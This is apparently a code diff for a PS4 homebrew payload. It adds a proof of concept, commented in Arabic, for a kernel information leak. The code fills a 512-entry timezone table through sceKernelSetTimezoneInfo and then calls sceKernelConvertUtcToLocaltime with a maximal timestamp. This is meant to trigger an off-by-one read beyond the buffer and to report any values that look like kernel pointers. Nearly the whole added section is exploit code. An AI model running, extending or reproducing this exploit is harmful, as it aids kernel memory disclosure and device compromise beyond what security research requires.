@@ -1,4 +1,4 @@
-
+*/
 #include "ps4.h"
 
 int _main(struct thread *td) {
@@ -80,7 +80,7 @@ int _main(struct thread *td) {
     return 0;
 }
 
-/*
+
 
 #include "ps4.h"
 
@@ -114,3 +114,73 @@ int _main(struct thread *td) {
     return 0;
 }
 */
+
+#include "ps4.h"
+
+int _main(struct thread *td) {
+    UNUSED(td);
+
+    initKernel();
+    initLibc();
+    initNetwork();
+    jailbreak();
+    initSysUtil();
+
+    printf_debug("=== timezone infoleak PoC ===\n");
+
+    // [1] ملأ الـ buffer كاملاً بـ 512 entry
+    // timestamps تصاعدية لإجبار binary search
+    // يختار آخر index = 511
+    static uint8_t data[512 * 16];
+    memset(data, 0, sizeof(data));
+
+    // نضع timestamps تصاعدية
+    for (int i = 0; i < 512; i++) {
+        // timestamp
+        *(long*)(data + i * 16)     = (long)i * 0x1000;
+        // offset — نضع marker
+        *(int*)(data  + i * 16 + 8) = 0x41410000 + i;
+        // dst
+        *(int*)(data  + i * 16 + 12) = 0x42420000 + i;
+    }
+
+    int r = sceKernelSetTimezoneInfo(data, 512);
+    printf_debug("set_timezone r=%d\n", r);
+
+    if (r != 0) {
+        printf_debug("[-] failed\n");
+        return 0;
+    }
+
+    // [2] استدعي مع timestamp كبير جداً
+    // لإجبار binary search يختار index = 511 (آخر entry)
+    // ثم off-by-one يجعله يقرأ من index = 512
+    // = خارج الـ buffer!
+    long out_local   = 0;
+    long out_tz[2]   = {0, 0};
+    int  out_dst     = 0;
+
+    r = sceKernelConvertUtcToLocaltime(
+        0x7FFFFFFFFFFFFFFF,  // timestamp ضخم جداً
+        &out_local,
+        out_tz,
+        &out_dst
+    );
+
+    printf_debug("convert r=%d\n",    r);
+    printf_debug("out_local=0x%lx\n", out_local);
+    printf_debug("out_tz[0]=0x%lx\n", out_tz[0]);
+    printf_debug("out_tz[1]=0x%lx\n", out_tz[1]);
+    printf_debug("out_dst  =0x%x\n",  out_dst);
+
+    // لو out_tz[0] أو out_local تحتوي على قيمة غريبة
+    // = قرأنا من kernel memory خارج الـ buffer!
+    // kernel pointers عادةً تبدأ بـ 0xffffffff
+    if ((out_local  & 0xffffffff00000000) == 0xffffffff00000000 ||
+        (out_tz[0]  & 0xffffffff00000000) == 0xffffffff00000000) {
+        printf_debug("[+] KERNEL POINTER LEAKED!\n");
+        printf_debug("leaked = 0x%lx\n", out_local);
+    }
+
+    return 0;
+}
